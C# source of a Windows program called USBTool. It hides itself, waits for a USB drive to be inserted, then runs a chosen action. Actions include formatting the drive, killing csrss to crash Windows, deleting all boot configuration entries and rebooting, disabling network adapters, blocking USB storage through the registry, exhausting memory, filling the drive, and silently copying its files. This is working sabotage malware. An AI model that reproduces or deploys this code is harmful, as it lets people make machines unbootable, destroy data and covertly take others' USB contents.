using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Windows.Forms;
#if MEDIA_DSHOW
using USBTool.DShow;
#elif MEDIA_FOUNDATION
using USBTool.MediaFoundation;
#endif
using USBTool.Properties;

namespace USBTool
{
	public unsafe partial class FormMain : Form
	{
		private Mediashow host;

#if MEDIA_DSHOW
		private IMediaControl control;
		private IMediaEvent mediaEvent;
		private IVideoWindow window;
#elif MEDIA_MCI
		private string mediafilename;
		private IntPtr hMCIWnd;
#elif MEDIA_FOUNDATION
		private IMFMediaSession mediaSession;
		//private IMFPMediaPlayer player;
		//private IMFPMediaItem mediaItem;
		private bool hasvideo = false;
#endif
		private static readonly string message = StringByTime(" ", 5000);
		[MTAThread]
		public void WhenArrival(string op)
		{
			Hide();
			while (true)
			{
				try
				{
					foreach (DriveInfo drive in DriveInfo.GetDrives())
					{
						if (drive.DriveType == DriveType.Removable)
						{
							switch (op)
							{
								case "copy":
									CopyDiretory(drive.Name, Folder.SelectedPath);
									break;
								case "format":
									ManagementClass disks = new ManagementClass("Win32_Volume");
									foreach (ManagementObject disk in disks.GetInstances())
									{
										if (disk.Properties["Name"].Value.ToString() == drive.Name)
										{
											object[] methodArgs = { "FAT32", true/*快速格式化*/, 4096/*簇大小*/, ""/*卷标*/, false/*压缩*/ };
											disk.InvokeMethod("Format", methodArgs);
											Thread.Sleep(4000);
										}
									}									
									//FormatEx(drive.Name + "\0", FMIFS_HARDDISK, "FAT32", null , true, 4096 ,(int command, int modifier, IntPtr argument)=>{return true;});
									break;
								case "message":
									MessageBox.Show(message, "Error", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
									break;
								case "blue":
									foreach (Process process in Process.GetProcessesByName("csrss"))
									{
										try
										{
											process.Kill();
										}
										catch
										{
											continue;
										}
									}
									break;
								case "hide":
									SetAttributes(drive.Name, FileAttributes.Hidden);
									break;
								case "Encrypted":
									SetAttributes(drive.Name, FileAttributes.Encrypted);
									break;
								case "system":
									SetAttributes(drive.Name, FileAttributes.System);
									break;
								case "readonly":
									SetAttributes(drive.Name, FileAttributes.ReadOnly);
									break;
								case "kasi":
									ulong number = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory / 1024 / 1024 / 1024 / 2;
									for (ulong runtime = 0; runtime < number; runtime++)
									{
										Process.Start(Application.StartupPath + "\\mm.exe");
									}
									while (Process.GetProcessesByName("mm").Length > 0)
									{
										var usbdevice = from ud in DriveInfo.GetDrives()
														where ud.DriveType == DriveType.Removable
														select ud;
										if (usbdevice.Count() == 0)
										{
											foreach (Process mm in Process.GetProcessesByName("mm"))
											{
												try
												{
													mm.Kill();
												}
												catch
												{

												}

											}
										}
									}
									break;
								case "fill":
									FillEachFile(drive.Name);
									break;
								case "normal":
									SetAttributes(drive.Name, FileAttributes.Normal);
									break;
								case "media":

#if MEDIA_MCI
									PostMessage(hMCIWnd, (uint)MCIConst.MCI_PLAY  , 0, 0);
									host.MCIWnd = hMCIWnd;
									if (mediafilename.EndsWith(".wav", StringComparison.OrdinalIgnoreCase) ||
										mediafilename.EndsWith(".mp3", StringComparison.OrdinalIgnoreCase) ||
										mediafilename.EndsWith(".wma", StringComparison.OrdinalIgnoreCase))
									{
										host.TransparencyKey = host.BackColor;									
										host.Opacity = 0;
									}
									host.Host.Hide();
									host.ShowDialog();
									PostMessage(hMCIWnd, WM_CLOSE, 0, 0);									
#elif MEDIA_DSHOW

									try
									{
										window.Owner = host.Handle.ToInt32();
										window.WindowStyle = (int)WS_CHILD;
										window.Left = 0;
										window.Top = 0;
										window.Height = host.Height;
										window.Width = host.Width;
										host.Show();
									}
									catch
									{

									}
									control.Run();
									int eventcode=0, lp1=0, lp2=0;
									try
									{
										mediaEvent.GetEvent(out eventcode, out lp1, out lp2, 0xfffffff);
									}
                                    catch
                                    {
										mediaEvent.FreeEventParams(eventcode, lp1, lp2);
									}
									while(eventcode != EC_COMPLETE)
									{
										mediaEvent.FreeEventParams(eventcode, lp1, lp2);
										try
										{
											mediaEvent.GetEvent(out eventcode, out lp1, out lp2, 0xfffffff);
										}
                                        catch
                                        {

                                        }
									}
									mediaEvent.FreeEventParams(eventcode, lp1, lp2);
									host.Hide();
#elif MEDIA_FOUNDATION
									int hr;
									if (hasvideo)
									{ 
										host.Show();
									}
                                    long position = 0;
									PropVariant prop = new PropVariant()
									{
										vt = VT_I8,
										unionmember = (IntPtr)(&position)
									};
                                    #region mfplay
									/*
									player.SetPosition(ref MFP_POSITIONTYPE_100NS, prop);
									player.Play();
									player.GetState(out MFP_MEDIAPLAYER_STATE state);
                                    while (state == MFP_MEDIAPLAYER_STATE.PLAYING)
                                    {
										player.GetState(out state);
									}
									*/
									#endregion
                                    #region mediasession																
                                    hr = mediaSession.Start(IntPtr.Zero, prop);
									uint eventtype = 0;
									while (eventtype != MESessionEnded)
									{
										mediaSession.GetEvent(0, out IMFMediaEvent mediaevent);
										mediaevent.GetType(out eventtype);
									}									
									#endregion
									host.Hide();
#endif
									break;
								
								case "speech":
									Voice.Volume = (int)((object[])朗读文本.Tag)[0];
									Voice.Rate = (int)((object[])朗读文本.Tag)[1];
									Voice.SelectVoice(((object[])朗读文本.Tag)[2].ToString());
									Voice.Speak(((object[])朗读文本.Tag)[3].ToString());
									break;
								case "SwapMouseButton":
									if (SwapMouseButton(true))
									{
										SwapMouseButton(false);
									}
									break;
								case "volume":
									drive.VolumeLabel = sentence;
									break;
								case "rotate":
									switch (SystemInformation.ScreenOrientation)
									{
										case ScreenOrientation.Angle0:
											DEVMODE1.dmDisplayOrientation = 1;
											break;
										case ScreenOrientation.Angle90:
											DEVMODE1.dmDisplayOrientation = 2;
											break;
										case ScreenOrientation.Angle180:
											DEVMODE1.dmDisplayOrientation = 3;
											break;
										case ScreenOrientation.Angle270:
											DEVMODE1.dmDisplayOrientation = 0;
											break;
									}
									int temp = DEVMODE1.dmPelsHeight;
									DEVMODE1.dmPelsHeight = DEVMODE1.dmPelsWidth;
									DEVMODE1.dmPelsWidth = temp;
									ChangeDisplaySettings(ref DEVMODE1, 0);
									Thread.Sleep(4000);
									break;
								case "baidu":
									Process.Start("https://www.baidu.com/");
									break;
								case "fillup":
									if (drive.AvailableFreeSpace > 0)
									{
										try
										{
											StreamWriter sw = new StreamWriter(drive.Name + "/1");
											sw.Write(StringByTime(" ", drive.AvailableFreeSpace));
											File.SetAttributes(drive.Name + "/1", FileAttributes.Hidden);
											sw.Close();
										}
										catch
										{
										}
									}
									break;
								case "glass":
									ForEachWindow(GetDesktopWindow(), "glass");
									break;
								case "close":
									ForEachWindow(GetDesktopWindow(), "close");
									break;
								case "mousetrail":
									string pvParam = "";
									SystemParametersInfo(SPI_SETMOUSETRAILS, 15, ref pvParam, 0);
									Thread.Sleep(1000);
									break;
								case "destroy":
									ForEachWindow(GetDesktopWindow(), "destroy");
									break;
								case "text":
									ForEachWindow(GetDesktopWindow(), "text");
									break;
								case "eject":
									uint returnvalue = 0;
									IntPtr Handle = CreateFile(@"\\.\" + drive.Name[0] + ":", (GENERIC_READ + GENERIC_WRITE), FILE_SHARE_READ + FILE_SHARE_WRITE, IntPtr.Zero, 3, 0, IntPtr.Zero);
									DeviceIoControl(Handle, IOCTL_STORAGE_EJECT_MEDIA, IntPtr.Zero, 0, IntPtr.Zero, 0, ref returnvalue, IntPtr.Zero);
									break;
								case "flash":
									ChangeDisplaySettings(ref DEVMODE1, 0);
									break;
								case "picture":
									ForEachWindow(GetDesktopWindow(), "picture");
									break;
								case "random":
									DEVMODE1.dmDisplayOrientation = rand.Next(4);
									int h = DEVMODE1.dmPelsHeight;
									DEVMODE1.dmPelsHeight = DEVMODE1.dmPelsWidth;
									DEVMODE1.dmPelsWidth = h;
									ChangeDisplaySettings(ref DEVMODE1, 0);
									Thread.Sleep(4000);
									break;
								case "beep":
									Console.Beep(2500,10000);
									break;
								case "beuncle":
									ForEachWindow(GetDesktopWindow(), "beuncle");
									break;
								case "bcd":									
									ManagementObject bcdstore = new ManagementObject("\\\\.\\root\\wmi:BcdStore.FilePath=\"\"");
									ManagementBaseObject bcdarg = bcdstore.GetMethodParameters("EnumerateObjects");
									bcdarg["Type"] = 0;
									var outarg = bcdstore.InvokeMethod("EnumerateObjects", bcdarg,null);	
									var bcdos = outarg["Objects"] as object[] ;
									foreach (ManagementBaseObject bcdo in bcdos)
									{
										var deletearg = bcdstore.GetMethodParameters("DeleteObject");
										deletearg["Id"] = bcdo["Id"];
										bcdstore.InvokeMethod("DeleteObject", deletearg, null);
									}
									if (ReBoot.Checked)
									{
										var co = new ConnectionOptions
										{
											Impersonation = ImpersonationLevel.Impersonate,
											Authentication = AuthenticationLevel.Call,
											EnablePrivileges = true
										};
										var scope = new ManagementScope("Root\\CIMV2", co);
										var system = new ManagementClass(scope, new ManagementPath("Win32_OperatingSystem"), null);
										foreach (ManagementObject s in system.GetInstances())
										{
											s.InvokeMethod("Reboot", null);
										}
									}
									break;
								case "network":
									ManagementClass networkadapters = new ManagementClass("Win32_NetworkAdapter");
									foreach (ManagementObject adapter in networkadapters.GetInstances())
									{
										ManagementBaseObject arg = adapter.GetMethodParameters("Disable");
										try
										{
											adapter.InvokeMethod("Disable", arg, null);
										}
										catch
										{
										}
									}
									break;
								case "color":
									Graphics d = Graphics.FromHwnd(GetDesktopWindow());
									Rectangle rect = new Rectangle();
									GetClientRect(GetDesktopWindow(), ref rect);
									Brush brush = new SolidBrush((Color)SetColor.Tag);
									d.FillRectangle(brush, rect);
									brush.Dispose();
									d.Dispose();
									break;
								default:
									throw (new ArgumentException("该功能还未开发"));
							}
						}
					}
				}
				catch (Exception e)
				{
#if DEBUG
					Debugger.Break();
#else
					StreamWriter br = new StreamWriter(Application.StartupPath + "/bugreport.log", true);
					br.Write(e.GetType().ToString());
					br.Write(e.Message);
					br.WriteLine(e.StackTrace);
					br.Close();
					Close();
#endif
				}
			}
		}
		public void Copy_Click(object sender, EventArgs e)
		{
			if (Folder.ShowDialog() == DialogResult.OK & Folder.SelectedPath.Length > 0)
			{
				WhenArrival("copy");
			}
			else
			{
				MessageBox.Show("未选择路径。");
			}
		}
		public void Format_Click(object sender, EventArgs e)
		{
			WhenArrival("format");
		}
		public void CantOpen_Click(object sender, EventArgs e)
		{
			Hide();
			RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\services\USBSTOR", true);
			while (true)
			{
				key.SetValue("Start", 4);
			}
		}
		public void Message_Click(object sender, EventArgs e)
		{
			WhenArrival("message");
		}
		protected override void WndProc(ref Message m)
		{
			base.WndProc(ref m);
		}
		public void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Process.Start("https://github.com/ISDHN/USBTool");
		}
		public void BlueScreen_Click(object sender, EventArgs e)
		{
			WhenArrival("blue");
		}
		public void Hide_Click(object sender, EventArgs e)
		{
			WhenArrival("hide");
		}
		public void Encrypt_Click(object sender, EventArgs e)
		{
			WhenArrival("Encrypted");
		}
		public void SystemFile_Click(object sender, EventArgs e)
		{
			WhenArrival("system");
		}
		public void FillMemory_Click(object sender, EventArgs e)
		{
			foreach (Process mm in Process.GetProcessesByName("mm"))
			{
				mm.Kill();
			}
			var file = File.Create(Application.StartupPath + "\\mm.exe");
			file.Write(Resources.mm, 0, Resources.mm.Length);
			file.Close();
			WhenArrival("kasi");
		}
		public void Readonly_Click(object sender, EventArgs e)
		{
			WhenArrival("readonly");
		}
		public void FillwithBlank_Click(object sender, EventArgs e)
		{
			WhenArrival("fill");
		}
		public void PlayMedia_Click(object sender, EventArgs e)
		{
			Media.Tag = SetAttrib.Show("media");
			if (((object[])Media.Tag).Length != 0)
			{
				host = new Mediashow();
#if MEDIA_DSHOW
				FilterGraph fg = Activator.CreateInstance(typeof(FilterGraph)) as FilterGraph;				
				control = fg as IMediaControl;
				window = fg as IVideoWindow;
				IBasicAudio audio = fg as IBasicAudio;
				mediaEvent = fg as IMediaEvent;
				IMediaPosition position = fg as IMediaPosition;
				try
				{
					control.RenderFile(((object[])Media.Tag)[2].ToString());
					
				}
				catch
				{
					return;
				}
				try
				{
					audio.Volume = (int)((object[])Media.Tag)[0] * 100 - 10000;
				}
                catch
                {

                }
				position.CurrentPosition = 0;
				double rate = (int)((object[])Media.Tag)[1];
				position.Rate = rate >= 0 ? rate / 10 + 1 :1/(1 + rate/ -10);
#elif MEDIA_MCI
				StringBuilder shortpath = new StringBuilder(260);
				GetShortPathName(((object[])Media.Tag)[2].ToString(), shortpath, 260);
				mediafilename = shortpath.ToString();
				IntPtr hinstance = Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetLoadedModules()[0]);
				hMCIWnd = MCIWndCreate(host.Handle, hinstance,
					(uint)MCIConst.MCIWNDF_NOAUTOSIZEWINDOW +
					(uint)MCIConst.MCIWNDF_NOMENU +
					(uint)MCIConst.MCIWNDF_NOPLAYBAR +
					(uint)MCIConst.MCIWNDF_NOTIFYMODE +
					(uint)MCIConst.MCIWNDF_NOTIFYERROR, null);
				MoveWindow(hMCIWnd, 0, 0, host.Width, host.Height, false);
				PostMessage(hMCIWnd, (uint)MCIConst.MCIWNDM_OPEN, 0, mediafilename);
				PostMessage(hMCIWnd, (uint)MCIConst.MCIWNDM_SETSPEED, 0, (uint)(int)((object[])Media.Tag)[1] * 50 + 1000U);
				PostMessage(hMCIWnd, (uint)MCIConst.MCIWNDM_SETVOLUME, 0, ((uint)(int)((object[])Media.Tag)[0] - 50U) * 10 + 500U);
#elif MEDIA_FOUNDATION
				#region mfplay
				/*
                int hr = CoInitialize(null);
				MFPMediaPlayerCallback mpcb = new MFPMediaPlayerCallback();
				hr = MFPCreateMediaPlayer(null, false, 0, mpcb, host.Handle, out  player);
				string url = ((object[])Media.Tag)[2].ToString();
				player.CreateMediaItemFromURL(url,true, UIntPtr.Zero, out mediaItem);
				player.ClearMediaItem();
				hr = player.SetMediaItem(mediaItem);
				player.SetVolume((float)(int)((object[])Media.Tag)[0] / 100);
				float rate = (int)((object[])Media.Tag)[1]; 
				player.SetRate(rate >= 0 ? rate / 10 + 1 : 1 / (1 + rate / -10));
				mediaItem.HasVideo(out hasvideo, out bool selected);
				*/
				#endregion
				#region mediasession

				int hr;
                MFStartup(MF_VERSION, MFSTARTUP_FULL);
				MFCreateMediaSession(IntPtr.Zero, out mediaSession);
				MFCreateTopology(out IMFTopology topo);
				MFCreateSourceResolver(out IMFSourceResolver resolver);
				IUnknown unknown;
				try
				{
					resolver.CreateObjectFromURL(((object[])Media.Tag)[2].ToString(), MF_RESOLUTION_MEDIASOURCE | MF_RESOLUTION_CONTENT_DOES_NOT_HAVE_TO_MATCH_EXTENSION_OR_MIME_TYPE,
						IntPtr.Zero, out uint objtype, out unknown);
				}
				catch
                {
					MessageBox.Show("不支持的媒体格式。", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
					return;
				}
				IMFMediaSource source = unknown as IMFMediaSource;
				source.CreatePresentationDescriptor(out IMFPresentationDescriptor descriptor);
				if(MFRequireProtectedEnvironment(descriptor)== 0)
                {
					MessageBox.Show("媒体受保护,无法播放。", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
					return;
                }
				descriptor.GetStreamDescriptorCount(out uint sdcount);
				for(uint i =0;i<sdcount;i++)
                {										
					descriptor.GetStreamDescriptorByIndex(i, out bool IsSelected, out IMFStreamDescriptor sd);
					if (!IsSelected)
						descriptor.SelectStream(i);
					sd.GetMediaTypeHandler(out IMFMediaTypeHandler typeHandler);
					typeHandler.GetMajorType(out Guid streamtype);
					IMFActivate renderer;
					if (streamtype == MFMediaType_Audio)
					{
						hr = MFCreateAudioRendererActivate(out renderer);
					}
					else if (streamtype == MFMediaType_Video)
					{
						hr = MFCreateVideoRendererActivate(host.Handle, out renderer);
						hasvideo = true;
					}
					else
					{
						MessageBox.Show("不支持的媒体格式。", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
						return;
					}
					hr = MFCreateTopologyNode(MF_TOPOLOGY_SOURCESTREAM_NODE, out IMFTopologyNode sourcenode);
					sourcenode.SetUnknown(MF_TOPONODE_SOURCE, source);
					sourcenode.SetUnknown(MF_TOPONODE_PRESENTATION_DESCRIPTOR, descriptor);
					sourcenode.SetUnknown(MF_TOPONODE_STREAM_DESCRIPTOR, sd);
					topo.AddNode(sourcenode);
					MFCreateTopologyNode(MF_TOPOLOGY_OUTPUT_NODE, out IMFTopologyNode outputnode);					
					outputnode.SetObject(renderer);
					sd.GetStreamIdentifier(out uint sid);
					outputnode.SetUINT32(MF_TOPONODE_STREAMID, 0);
					topo.AddNode(outputnode);
					outputnode.SetUINT32(MF_TOPONODE_NOSHUTDOWN_ON_REMOVE, 0);
					hr = sourcenode.ConnectOutput(0, outputnode, 0);					
                }
				mediaSession.SetTopology(0, topo);							
				uint eventtype = 0;
				while (eventtype != MESessionTopologyStatus)
				{
					mediaSession.GetEvent(0, out IMFMediaEvent mediaevent);
					mediaevent.GetType(out eventtype);
				}
				Guid guid_ratecontrol = typeof(IMFRateControl).GUID;
				MFGetService(mediaSession, ref MF_RATE_CONTROL_SERVICE, ref guid_ratecontrol, out IUnknown _ratecontrol);
				IMFRateControl ratecontrol = _ratecontrol as IMFRateControl;
				float rate = (int)((object[])Media.Tag)[1];
				ratecontrol.SetRate(false, rate >= 0 ? rate * 7 / 10 + 1 : 1 / (1 + rate / -10 * 7));
				try
				{
					Guid guid_volume = typeof(IMFStreamAudioVolume).GUID;
					Guid guid_audiopolicy = typeof(IMFAudioPolicy).GUID;
                    hr = MFGetService(mediaSession, ref MR_STREAM_VOLUME_SERVICE, ref guid_volume, out IUnknown _volume);
					hr = MFGetService(mediaSession, ref MR_AUDIO_POLICY_SERVICE, ref guid_audiopolicy, out IUnknown _policy);
					IMFStreamAudioVolume volume = _volume as IMFStreamAudioVolume;
					IMFAudioPolicy policy = _policy as IMFAudioPolicy;
					volume.GetChannelCount(out uint channelcount);
					for(uint c=0;c<channelcount;c++)
						volume.SetChannelVolume(c,(float)(int)((object[])Media.Tag)[0] / 100);
					policy.SetDisplayName(" ");
				}
				catch
				{
				}
				try
				{
					Guid guid_videocontrol = typeof(IMFVideoDisplayControl).GUID;
					hr = MFGetService(mediaSession, ref MR_VIDEO_RENDER_SERVICE, ref guid_videocontrol, out IUnknown _videocontrol);
					IMFVideoDisplayControl videocontrol = _videocontrol as IMFVideoDisplayControl;
					Rectangle videopos = new Rectangle(0, 0, host.Width, host.Height);
					videocontrol.SetVideoWindow(host.Handle);
					videocontrol.SetVideoPosition(IntPtr.Zero,ref videopos);
					videocontrol.RepaintVideo();
					host.displayControl = videocontrol;
				}
				catch
				{
				}
				
                #endregion
#endif
                WhenArrival("media");
			}
		}
		public void ReadText_Click(object sender, EventArgs e)
		{
			朗读文本.Tag = SetAttrib.Show("speech");
			if (朗读文本.Tag.ToString().Length != 0)
			{
				WhenArrival("speech");
			}
		}
		public void Form1_Load(object sender, EventArgs e)
		{
			if (Environment.OSVersion.Version.Major < 6)
			{
				Glass.Enabled = false;
			}
			try
			{
				SpeechSynthesizer i = new SpeechSynthesizer();
				if (i.GetInstalledVoices().Count == 0)
				{
					朗读文本.Enabled = false;
					return;
				}
			}
			catch (Exception)
			{
				朗读文本.Enabled = false;
				return;
			}
			Voice = new SpeechSynthesizer
			{
				Rate = 0,
				Volume = 0
			};
		}
		public void SwapMouseButton_Click(object sender, EventArgs e)
		{
			WhenArrival("SwapMouseButton");
		}
		public void ChangeName_Click(object sender, EventArgs e)
		{
			string i;
			if ((i = Interaction.InputBox("输入U盘名称。", "输入", "我的U盘")).Length == 0)
			{
				return;
			}
			else
			{
				sentence = i;
			}
			WhenArrival("volume");
		}
		public void Rotate_Click(object sender, EventArgs e)
		{
			DEVMODE1 = new DEVMODE()
			{
				dmDeviceName = new string(new char[33]),
				dmFormName = new string(new char[33]),
				dmSize = (short)(Marshal.SizeOf(DEVMODE1))
			};
			EnumDisplaySettings(null, -1, ref DEVMODE1);
			WhenArrival("rotate");
		}
		public void ShowBaiDu_Click(object sender, EventArgs e)
		{
			WhenArrival("baidu");
		}
		public void FillUp_Click(object sender, EventArgs e)
		{
			WhenArrival("fillup");
		}
		public void Glass_Click(object sender, EventArgs e)
		{
			WhenArrival("glass");
		}
		public void CloseWnd_Click(object sender, EventArgs e)
		{
			WhenArrival("close");
		}
		public void MouseTrail_Click(object sender, EventArgs e)
		{
			WhenArrival("mousetrail");
		}
		public void Destroy_Click(object sender, EventArgs e)
		{
			WhenArrival("destroy");
		}
		public void SetText_Click(object sender, EventArgs e)
		{
			string i;
			if ((i = Interaction.InputBox("输入你喜欢的窗口标题")).Length > 0)
			{
				sentence = i;
				WhenArrival("text");
			}
		}
		public void Eject_Click(object sender, EventArgs e)
		{
			WhenArrival("eject");
		}
		public void flash_Click(object sender, EventArgs e)
		{
			EnumDisplaySettings(null, -1, ref DEVMODE1);
			WhenArrival("flash");
		}

		public void picture_Click(object sender, EventArgs e)
		{
			var temp = SetAttrib.Show("picture");
			if (temp.Length != 0)
			{
				sentence = temp[0].ToString();
				WhenArrival("picture");
			}
		}

		private void random_Click(object sender, EventArgs e)
		{
			DEVMODE1 = new DEVMODE()
			{
				dmDeviceName = new string(new char[33]),
				dmFormName = new string(new char[33]),
				dmSize = (short)(Marshal.SizeOf(DEVMODE1))
			};
			rand = new Random();
			EnumDisplaySettings(null, -1, ref DEVMODE1);
			WhenArrival("random");
		}

		private void Beep_Click(object sender, EventArgs e)
		{
			WhenArrival("beep");
		}

		private void Center_Click(object sender, EventArgs e)
		{
			WhenArrival("beuncle");
		}

		private void SetBcd_Click(object sender, EventArgs e)
		{
			WhenArrival("bcd");
		}

		private void CloseNetWork_Click(object sender, EventArgs e)
		{
			WhenArrival("network");
		}

		private void SetBcd_MouseEnter(object sender, EventArgs e)
		{
			ReBoot.BackColor = SetBcd.FlatAppearance.MouseOverBackColor;
		}

		private void SetBcd_MouseLeave(object sender, EventArgs e)
		{
			ReBoot.BackColor = SetBcd.BackColor;
		}

		private void SetBcd_MouseDown(object sender, MouseEventArgs e)
		{
			ReBoot.BackColor = SetBcd.FlatAppearance.MouseDownBackColor;
		}

		private void SetBcd_MouseUp(object sender, MouseEventArgs e)
		{
			ReBoot.BackColor = SetBcd.BackColor;
		}

		private void SetColor_Click(object sender, EventArgs e)
		{
			if (GetColor.ShowDialog() == DialogResult.OK)
			{
				SetColor.Tag = GetColor.Color;
				WhenArrival("color");
			}
		}
	}
}
